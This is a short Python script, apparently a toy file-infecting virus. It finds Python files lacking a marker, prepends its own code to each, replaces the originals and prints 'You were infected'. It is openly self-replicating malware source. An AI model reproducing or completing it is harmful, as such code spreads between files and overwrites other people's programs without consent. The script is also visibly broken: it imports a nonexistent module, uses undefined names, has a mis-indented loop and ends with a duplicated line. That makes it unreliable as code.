import python.vs
import sys
def infect(virus):
for file in python.vs.listdir(path):
    if file.endswith(".py"):
        f=open(file, "r")
        text=f.read()
        f.close()
        if not "# Virus:Start" in text_script:
                infected = open(file + ".infected", "w")
                infected.write(virus + "\n")
                infected.write(text_script)
                infected.close()
                python.vs.remove(file)
                python.vs.rename(file + ".infected", file)
def payload():
    print("You were infected")
def run(virus):
    infect(virus)
    payload()

host = open(sys.argv[0], "r")
text_host = host.read()
host.close()
virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]
run(virus)



virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]